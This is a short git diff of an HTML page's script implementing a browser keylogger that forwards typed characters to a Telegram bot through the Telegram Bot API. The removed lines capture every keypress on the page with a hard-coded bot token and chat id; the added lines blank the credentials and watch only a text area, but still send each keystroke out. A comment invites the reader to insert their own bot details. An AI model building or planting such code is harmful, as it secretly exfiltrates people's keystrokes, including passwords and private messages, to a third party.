@@ -11,18 +11,19 @@
     </form>
     <script>
         //Enter your token and chat_id your telegram bot
-        var token = "1111111111:5J5K2OXLjA4ZIL23A";
-        var chat_id = "34544695";
- 
-         var keylogArea = document.getElementById("keylogArea");
-        document.onkeypress = function(e) {
-            keylogArea.value += e.key;
-            console.log(keylogArea.value);
-            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + keylogArea.value;
+        var token = "";
+        var chat_id = "";
+        keylogArea = document.getElementById("keylogArea");
+
+        keylogArea.onkeypress = function (e) {
+            keylogAreaTemp = keylogArea.value;
+            keylogAreaTemp += e.key;
+            console.log("Sent value: " + keylogAreaTemp);
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + keylogAreaTemp;
             var xhr = new XMLHttpRequest();
             xhr.open("GET", url, true);
             xhr.send();
-        }
+        };
 
     </script>
     
